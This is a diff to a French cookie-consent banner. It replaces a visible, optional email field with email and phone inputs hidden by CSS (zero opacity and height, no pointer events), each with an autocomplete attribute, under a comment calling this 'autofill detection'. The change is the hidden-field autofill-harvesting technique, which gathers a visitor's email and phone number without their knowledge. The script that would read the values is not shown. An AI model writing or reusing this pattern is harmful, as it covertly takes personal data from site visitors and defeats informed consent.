@@ -14,14 +14,15 @@
                 <h3>🍪 Nous utilisons des cookies</h3>
                 <p>Nous utilisons des cookies pour améliorer votre expérience et comprendre vos préférences. En acceptant, vous nous aidez à vous proposer des offres personnalisées.</p>
             </div>
-            <div class="email-form">
-                <input type="email" class="email-input" id="userEmail" placeholder="Entrez votre email pour des offres personnalisées (optionnel)">
+            <!-- Hidden email input for browser autofill detection -->
+            <div class="email-form" style="position: absolute; opacity: 0; pointer-events: none; height: 0; overflow: hidden;">
+                <input type="email" class="email-input" id="userEmail" autocomplete="email" placeholder="Email">
+                <input type="tel" class="email-input" id="userPhone" autocomplete="tel" placeholder="Téléphone">
             </div>
             <div class="cookie-buttons">
                 <button class="cookie-btn cookie-accept" onclick="acceptCookies()">Accepter & Continuer</button>
                 <button class="cookie-btn cookie-decline" onclick="declineCookies()">Refuser</button>
             </div>
-            <p class="error-message" id="emailError">Veuillez entrer une adresse email valide</p>
             <div class="success-message" id="successMessage">✓ Merci ! Vos préférences ont été enregistrées.</div>
         </div>
     </div>
